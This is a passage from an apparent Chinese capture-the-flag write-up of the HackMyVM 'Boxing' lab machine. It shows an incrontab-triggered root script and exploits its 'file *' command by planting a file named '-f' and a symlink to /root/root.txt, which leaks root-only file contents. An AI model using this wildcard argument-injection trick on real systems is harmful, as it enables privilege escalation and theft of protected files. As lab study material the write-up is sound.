pan\u003e \u003cspan class=\"hljs-string\"\u003e'/etc IN_DELETE,IN_MODIFY,IN_MOVED_FROM /bin/echo \"File: $@/$# =\u003e $%\" \u003e /root/user_flag.log'\u003c/span\u003e | incrontab -\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/home/cassius/user.txt IN_ATTRIB /opt/sos/sos.sh'\u003c/span\u003e | incrontab -\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当 \u003ccode\u003e/home/cassius/user.txt\u003c/code\u003e 文件的属性（如权限、时间戳等）发生变化时，执行 \u003ccode\u003e/opt/sos/sos.sh\u003c/code\u003e 脚本。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecassius@boxing:/opt/sos$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e sos.sh \n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\n\nlogs=\u003cspan class=\"hljs-string\"\u003e\"/opt/sos/logs/output-logs.txt\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$logs\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e \u0026#x26;\u003e\u003cspan class=\"hljs-variable\"\u003e$logs\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e /home/cassius\nfile *\nss -altupn\nlast -a\nw\nps aux\ntop -n 1\nlsof\n\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e $(\u003cspan class=\"hljs-built_in\"\u003ecut\u003c/span\u003e -f1 -d: /etc/passwd); \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Cron jobs for \u003cspan class=\"hljs-variable\"\u003e$user\u003c/span\u003e:\"\u003c/span\u003e\ncrontab -u \u003cspan class=\"hljs-variable\"\u003e$user\u003c/span\u003e -l\n\u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003etail\u003c/span\u003e /var/log/syslog\n\u003cspan class=\"hljs-built_in\"\u003esha256sum\u003c/span\u003e /bin/* /sbin/* /usr/bin/* /usr/sbin/*\n\n\u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e 700 \u003cspan class=\"hljs-variable\"\u003e$logs\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中最有问题的就是 \u003ccode\u003efile *\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e是 Shell 的通配符，表示“匹配当前目录下所有非隐藏文件”。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e当输入 \u003ccode\u003efile *\u003c/code\u003e 时，Shell 会先将  扩展为当前目录下的所有非隐藏文件名（例如 \u003ccode\u003efile1.txt file2.jpg dir1\u003c/code\u003e），然后将这些文件名作为参数传递给 \u003ccode\u003efile\u003c/code\u003e 命令。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e例如，如果当前目录有 \u003ccode\u003ea.txt\u003c/code\u003e、\u003ccode\u003eb.jpg\u003c/code\u003e、\u003ccode\u003ec.sh\u003c/code\u003e，则 \u003ccode\u003efile *\u003c/code\u003e 实际会变成：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efile a.txt b.jpg c.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e那么如果里面有一个名为 \u003ccode\u003e-f\u003c/code\u003e 的文件，这会：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMBoxing/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecassius@boxing:~$ \u003cspan class=\"hljs-built_in\"\u003etouch\u003c/span\u003e ./-f\ncassius@boxing:~$ \u003cspan class=\"hljs-built_in\"\u003eln\u003c/span\u003e -sv /root/root.txt root.txt\ncassius@boxing:~$ \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e :; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ecp\u003c/span\u003e /opt/sos/logs/output-logs.txt /tmp/output-logs.txt 2\u003e/dev/null;\u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e \u0026#x26;\n[1] 1716\n\u003cspan class=\"hljs-string\"\u003e'root.txt'\u003c/span\u003e -\u003e \u003cspan class=\"hljs-string\"\u003e'/root/root.txt'\
